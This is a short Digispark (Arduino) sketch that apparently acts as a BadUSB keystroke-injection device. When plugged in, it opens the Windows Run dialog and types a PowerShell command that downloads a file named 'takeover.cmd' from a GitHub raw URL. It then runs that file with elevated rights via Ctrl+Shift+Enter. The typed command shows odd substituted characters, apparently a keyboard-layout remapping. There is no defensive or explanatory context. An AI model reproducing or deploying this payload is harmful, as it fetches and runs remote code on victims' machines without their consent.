#include "DigiKeyboard.h"

void setup() {

}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("cmd {k powershell  /command :Invoke/WebRequest /Uri https>{{raw.githubusercontent.com{Fidasek))({!##&{main{takeover.cmd /OutFile .{takeover.cmd` .{takeover.cmd:");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);

  for(;;)
  {
  }
}
